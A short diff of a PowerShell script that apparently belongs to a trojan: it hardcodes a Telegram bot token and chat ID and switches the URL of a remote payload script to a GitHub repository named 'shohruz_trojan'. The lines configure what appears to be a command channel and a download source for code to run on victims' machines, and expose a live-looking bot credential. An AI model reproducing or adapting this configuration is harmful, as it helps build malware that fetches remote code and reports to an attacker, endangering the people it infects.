@@ -7,7 +7,7 @@ $PSDefaultParameterValues['Invoke-WebRequest:UseBasicParsing'] = $true
 
 $BotToken = "7972302899:AAFkbSVy4Q-c62yhkAHDOTAIwOPZaqJANdA"
 $ChatID = '7518382960'
-$githubScript = 'https://raw.githubusercontent.com/codexpuz/lol/main/poc.ps1'
+$githubScript = 'https://raw.githubusercontent.com/Hiki0611/shohruz_trojan/main/poc.ps1'
 $ipv4Regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
 
 ###############
